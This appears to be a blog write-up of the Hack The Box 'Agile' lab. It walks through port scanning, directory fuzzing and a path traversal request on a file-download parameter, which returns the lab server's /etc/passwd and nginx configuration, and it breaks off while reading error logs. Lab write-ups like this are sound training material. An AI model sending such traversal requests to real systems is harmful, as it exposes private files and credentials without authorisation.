<!DOCTYPE html>
<html lang="en-US">

<head>
  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="shortcut icon" href="https://jordangalida.github.io/images/ability_poisons.jpg" />
<title>HTB Agile Write-up | Jordan&#39;s Blog</title>
<meta name="title" content="HTB Agile Write-up" />
<meta name="description" content="A write-up for the Agile box." />
<meta name="keywords" content="HTB,Pentesting," />


<meta property="og:url" content="https://jordangalida.github.io/htb-agile-write-up/">
  <meta property="og:site_name" content="Jordan&#39;s Blog">
  <meta property="og:title" content="HTB Agile Write-up">
  <meta property="og:description" content="A write-up for the Agile box.">
  <meta property="og:locale" content="en_US">
  <meta property="og:type" content="article">
    <meta property="article:section" content="blog">
    <meta property="article:published_time" content="2025-03-13T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-03-13T00:00:00+00:00">
    <meta property="article:tag" content="HTB">
    <meta property="article:tag" content="Pentesting">
    <meta property="og:image" content="https://jordangalida.github.io/images/share.png">




  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://jordangalida.github.io/images/share.png">
  <meta name="twitter:title" content="HTB Agile Write-up">
  <meta name="twitter:description" content="A write-up for the Agile box.">




  <meta itemprop="name" content="HTB Agile Write-up">
  <meta itemprop="description" content="A write-up for the Agile box.">
  <meta itemprop="datePublished" content="2025-03-13T00:00:00+00:00">
  <meta itemprop="dateModified" content="2025-03-13T00:00:00+00:00">
  <meta itemprop="wordCount" content="3985">
  <meta itemprop="image" content="https://jordangalida.github.io/images/share.png">
  <meta itemprop="keywords" content="HTB,Pentesting">
<meta name="referrer" content="no-referrer-when-downgrade" />

  <style>
  :root {
      --width: 800px;
      --font-main: "Courier New", monospace;
      --font-secondary: "Courier New", monospace;
      --font-scale: 1em;
      --background-color: #fff;
      --heading-color: #222;
      --text-color: #444;
      --link-color: #32ab60;
      --visited-color:  #32ab60;
      --code-background-color: #f2f2f2;
      --code-color: #222;
      --blockquote-color: #222;
      --overflow-wrap: break-word;
  }

  @media (prefers-color-scheme: dark) {
      :root {
          --background-color: #070b0a;
          --heading-color: #32ab60;
          --text-color: #32ab60;
          --link-color: #32ab60;
          --visited-color:  #32ab60;
          --code-background-color: #272822;
          --code-color: #ddd;
          --blockquote-color: #ccc;
      }
  }

  body {
      font-family: var(--font-secondary);
      font-size: var(--font-scale);
      margin: auto;
      padding: 20px;
      max-width: var(--width);
      text-align: left;
      background-color: var(--background-color);
      word-wrap: break-word;
      overflow-wrap: break-word;
      white-space: normal;
      line-height: 1.5;
      color: var(--text-color);
  }

  h1, h2, h3, h4, h5, h6 {
      font-family: var(--font-main);
      color: var(--heading-color);
  }

  a {
      color: var(--link-color);
      cursor: pointer;
      text-decoration: none;
  }

  a:hover {
      text-decoration: underline; 
  }

  nav a {
      margin-right: 8px;
  }

  strong, b {
      color: var(--heading-color);
  }

  button {
      margin: 0;
      cursor: pointer;
  }

  main {
      line-height: 1.6;
  }

  table {
      width: 100%;
  }

  hr {
      border: 0;
      border-top: 1px dashed;
  }

  img {
      max-width: 100%;
  }

  pre {
      white-space: pre-wrap !important;
      overflow-x: auto !important;
      word-break: break-all !important;
      max-width: var(--width) !important;
      margin: 0 !important;
  }

  code {
      font-family: "Courier New", monospace;
      background-color: var(--code-background-color);
      color: var(--code-color);
      white-space: pre-wrap;
      word-wrap: break-word;
      overflow-wrap: anywhere;
  }

  blockquote {
      border-left: 1px solid #999;
      color: var(--code-color);
      padding-left: 20px;
      font-style: italic;
      text-wrap: wrap;
  }

  footer {
      padding: 25px 0;
      text-align: center;
  }

  .title:hover {
      text-decoration: none;
  }

  .title h1 {
      font-size: 1.5em;
  }

  .inline {
      width: auto !important;
  }

  .highlight, .code {
      background-color: var(--code-background-color);
      color: var(--code-color);
      padding: 5px 10px;
      word-break: normal;
      white-space: pre-wrap; 
      overflow-wrap: anywhere;
      overflow-x: auto;
  }

   
  ul.blog-posts {
      list-style-type: none;
      padding: unset;
  }

  ul.blog-posts li {
      display: flex;
  }

  ul.blog-posts li span {
      flex: 0 0 130px;
  }

  ul.blog-posts li a:visited {
      color: var(--visited-color);
</style>

</head>

<body>
  <header><a href="/" class="title">
  <h2>Jordan&#39;s Blog</h2>
</a>
<nav><a href="/">Home</a>


<a href="/blog">Blog</a>

</nav>
</header>
  <main>

<h1>HTB Agile Write-up</h1>
<p>
  <i>
    <time datetime='2025-03-13'>
      13 Mar, 2025
    </time>
  </i>
</p>

<content>
  <p>This box was a bit more difficult than past ones I have done in this CPTS playlist. This is mainly due to the complex interconnected parts of the Python web application. We start off by finding a local file disclosure vulnerability</p>
<p>We start off by running an <code>nmap</code> scan with scripting enabled, and version detection on all ports</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap -sC -sV -p- 10.10.11.203 -oA Scans/
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-13 18:42 EDT
</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.11.203
</span></span><span style="display:flex;"><span>Host is up (0.021s latency).
</span></span><span style="display:flex;"><span>Not shown: 65533 closed tcp ports (reset)
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
</span></span><span style="display:flex;"><span>| ssh-hostkey:
</span></span><span style="display:flex;"><span>|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)
</span></span><span style="display:flex;"><span>|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)
</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 (Ubuntu)
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://superpass.htb
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 (Ubuntu)
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 19.54 seconds
</span></span></code></pre></div><p>Only two ports are open - HTTP and SSH. Let&rsquo;s take a look at the webserver. Immediately, the IP is changed to <code>http://superpass.htb/</code>, so we update our <code>/etc/hosts</code> to reflect that. We refresh the page and it resolves
<img src="/images/Agile/website.png" alt="Website"></p>
<p>It says it&rsquo;s a password manager. Let&rsquo;s do some directory fuzzing</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$gobuster dir -u http://superpass.htb -w /usr/share/wordlists/dirb/common.txt -t <span style="color:#ae81ff">300</span>
</span></span><span style="display:flex;"><span>===============================================================
</span></span><span style="display:flex;"><span>Gobuster v3.6
</span></span><span style="display:flex;"><span>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span><span style="display:flex;"><span>===============================================================
</span></span><span style="display:flex;"><span>[+] Url:                     http://superpass.htb
</span></span><span style="display:flex;"><span>[+] Method:                  GET
</span></span><span style="display:flex;"><span>[+] Threads:                 300
</span></span><span style="display:flex;"><span>[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
</span></span><span style="display:flex;"><span>[+] Negative Status codes:   404
</span></span><span style="display:flex;"><span>[+] User Agent:              gobuster/3.6
</span></span><span style="display:flex;"><span>[+] Timeout:                 10s
</span></span><span style="display:flex;"><span>===============================================================
</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
</span></span><span style="display:flex;"><span>===============================================================
</span></span><span style="display:flex;"><span>/download             (Status: 302) [Size: 249] [--&gt; /account/login?next=%2Fdownload]
</span></span><span style="display:flex;"><span>/static               (Status: 301) [Size: 178] [--&gt; http://superpass.htb/static/]
</span></span><span style="display:flex;"><span>/vault                (Status: 302) [Size: 243] [--&gt; /account/login?next=%2Fvault]
</span></span><span style="display:flex;"><span>Progress: 4614 / 4615 (99.98%)
</span></span><span style="display:flex;"><span>===============================================================
</span></span><span style="display:flex;"><span>Finished
</span></span><span style="display:flex;"><span>===============================================================
</span></span></code></pre></div><p>We see a <code>download</code> and <code>vault</code>. Very interesting. There is also a login portal on the website. When trying a common credential pair admin:admin, we get a strange result
<img src="/images/Agile/sql.png" alt="Website"></p>
<p>Looks like a SQL error that says lost connection to MySQL. We also see references to Python. There is also information about what looks like the SQL query</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>sqlalchemy.exc.OperationalError: (pymysql.err.OperationalError) (2013, &#39;Lost connection to MySQL server during query&#39;) [SQL: SELECT users.id AS users_id, users.username AS users_username, users.hashed_password AS users_hashed_password FROM users WHERE users.username = %(username_1)s LIMIT %(param_1)s] [parameters: {&#39;username_1&#39;: &#39;admin&#39;, &#39;param_1&#39;: 1}] (Background on this error at: https://sqlalche.me/e/14/e3q8)
</span></span></code></pre></div><p>There is also a function to register a user. After registering, we are taken to a home page <code>/vault</code>
<img src="/images/Agile/register.png" alt="Website"></p>
<p>Let&rsquo;s add a password
<img src="/images/Agile/add.png" alt="Website"></p>
<p>There is a function to export. Let&rsquo;s look at the request in Burp</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /download?fn=hacker_export_91b8681bdb.csv <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">superpass.htb</span>
</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0</span>
</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">remember_token=9|dc4f849e4492fdc4dab194ba371d39b00ad86a2e4cdc0a84c66c21ecbdf2360a9324de834cb47170ef1107755fa3a28b174ae50c69e7a0571f1311ab124fc7ab; session=.eJwlzkkOwjAMAMC_5MwhXuqln0FO7AiuLT0h_g4S84J5t_s66ny0_XVcdWv3Z7a9lWOkE-haW4kOJjUSdjcEUAhnR9SUQBiTmEG1AlZZF0ypRclT2Jywp4_JYDFMAITDUSDmGBqblkIP2qi60ApJSHK1uaz9ItdZx3_j7fMFOgkuCA.Z9Nkkw.2MhARMSbEZofegN-_7jUxf3nNEM</span>
</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Priority<span style="color:#f92672">:</span> <span style="color:#ae81ff">u=0, i</span>
</span></span></code></pre></div><p>I&rsquo;m mainly interested in the hash after <code>export_</code>. If this is guessable, then we may be able to get passwords from other user&rsquo;s vaults. I submit another request to see how much it changes</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /download?fn=hacker_export_42045271c5.csv <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">superpass.htb</span>
</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0</span>
</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">remember_token=9|dc4f849e4492fdc4dab194ba371d39b00ad86a2e4cdc0a84c66c21ecbdf2360a9324de834cb47170ef1107755fa3a28b174ae50c69e7a0571f1311ab124fc7ab; session=.eJwlzkkOwjAMAMC_5MwhXuqln0FO7AiuLT0h_g4S84J5t_s66ny0_XVcdWv3Z7a9lWOkE-haW4kOJjUSdjcEUAhnR9SUQBiTmEG1AlZZF0ypRclT2Jywp4_JYDFMAITDUSDmGBqblkIP2qi60ApJSHK1uaz9ItdZx3_j7fMFOgkuCA.Z9Nkkw.2MhARMSbEZofegN-_7jUxf3nNEM</span>
</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Priority<span style="color:#f92672">:</span> <span style="color:#ae81ff">u=0, i</span>
</span></span></code></pre></div><p>Much different. Well, it&rsquo;s downloading a file so this may be a good spot to attempt Local File Disclosure</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /download?fn=../../../../etc/passwd <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">superpass.htb</span>
</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0</span>
</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">remember_token=9|dc4f849e4492fdc4dab194ba371d39b00ad86a2e4cdc0a84c66c21ecbdf2360a9324de834cb47170ef1107755fa3a28b174ae50c69e7a0571f1311ab124fc7ab; session=.eJwlzkkOwjAMAMC_5MwhXuqln0FO7AiuLT0h_g4S84J5t_s66ny0_XVcdWv3Z7a9lWOkE-haW4kOJjUSdjcEUAhnR9SUQBiTmEG1AlZZF0ypRclT2Jywp4_JYDFMAITDUSDmGBqblkIP2qi60ApJSHK1uaz9ItdZx3_j7fMFOgkuCA.Z9Nkkw.2MhARMSbEZofegN-_7jUxf3nNEM</span>
</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Priority<span style="color:#f92672">:</span> <span style="color:#ae81ff">u=0, i</span>
</span></span></code></pre></div><p>It works!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>HTTP/1.1 200 OK
</span></span><span style="display:flex;"><span>Server: nginx/1.18.0 (Ubuntu)
</span></span><span style="display:flex;"><span>Date: Thu, 13 Mar 2025 23:19:58 GMT
</span></span><span style="display:flex;"><span>Content-Type: text/csv; charset=utf-8
</span></span><span style="display:flex;"><span>Content-Length: 1744
</span></span><span style="display:flex;"><span>Connection: keep-alive
</span></span><span style="display:flex;"><span>Content-Disposition: attachment; filename=superpass_export.csv
</span></span><span style="display:flex;"><span>Vary: Cookie
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>root:x:0:0:root:/root:/bin/bash
</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>pollinate:x:105:1::/var/cache/pollinate:/bin/false
</span></span><span style="display:flex;"><span>sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>corum:x:1000:1000:corum:/home/corum:/bin/bash
</span></span><span style="display:flex;"><span>dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>mysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false
</span></span><span style="display:flex;"><span>runner:x:1001:1001::/app/app-testing/:/bin/sh
</span></span><span style="display:flex;"><span>edwards:x:1002:1002::/home/edwards:/bin/bash
</span></span><span style="display:flex;"><span>dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
</span></span><span style="display:flex;"><span>_laurel:x:999:999::/var/log/laurel:/bin/false
</span></span></code></pre></div><p>A few things we can try from here:</p>
<ol>
<li>Request SSH keys</li>
<li>Request the source code to see how the site is generating the hash at the end of the downloads and attempt to grab another user&rsquo;s vault</li>
<li>Attempt to use PHP wrappers for RCE</li>
<li>Log poisoning</li>
</ol>
<p>Let&rsquo;s go through them starting with the easiest wins. Requesting SSH private keys doesn&rsquo;t result in anything. Requesting <code>nginx.conf</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">nginx/1.18.0 (Ubuntu)</span>
</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Thu, 13 Mar 2025 23:26:33 GMT</span>
</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/csv; charset=utf-8</span>
</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">1447</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Content-Disposition<span style="color:#f92672">:</span> <span style="color:#ae81ff">attachment; filename=superpass_export.csv</span>
</span></span><span style="display:flex;"><span>Vary<span style="color:#f92672">:</span> <span style="color:#ae81ff">Cookie</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">user www-data;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">worker_processes auto;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">pid /run/nginx.pid;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">include /etc/nginx/modules-enabled/*.conf;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">events {</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	worker_connections 768;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# multi_accept on;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">http {</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	##</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# Basic Settings</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	##</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	sendfile on;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	tcp_nopush on;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	types_hash_max_size 2048;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# server_tokens off;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# server_names_hash_bucket_size 64;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# server_name_in_redirect off;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	include /etc/nginx/mime.types;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	default_type application/octet-stream;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	##</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# SSL Settings</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	##</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3</span>,<span style="color:#e6db74"> ref: POODLE</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	ssl_prefer_server_ciphers on;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	##</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# Logging Settings</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	##</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	access_log /var/log/nginx/access.log;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	error_log /var/log/nginx/error.log;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	##</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# Gzip Settings</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	##</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	gzip on;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# gzip_vary on;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# gzip_proxied any;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# gzip_comp_level 6;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# gzip_buffers 16 8k;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# gzip_http_version 1.1;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	##</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# Virtual Host Configs</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	##</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	include /etc/nginx/conf.d/*.conf;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	include /etc/nginx/sites-enabled/*;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#mail {</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#	# See sample authentication script at:</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#	# http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#	# auth_http localhost/auth.php;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#	# pop3_capabilities &#34;TOP&#34; &#34;USER&#34;;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#	# imap_capabilities &#34;IMAP4rev1&#34; &#34;UIDPLUS&#34;;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#	server {</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#		listen     localhost:110;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#		protocol   pop3;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#		proxy      on;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#	}</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#	server {</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#		listen     localhost:143;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#		protocol   imap;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#		proxy      on;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#	}</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#}</span>
</span></span></code></pre></div><p>We can view the error logs</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">nginx/1.18.0 (Ubuntu)</span>
</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Thu, 13 Mar 2025 23:34:30 GMT</span>
</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/csv; charset=utf-8</span>
</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">66532</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
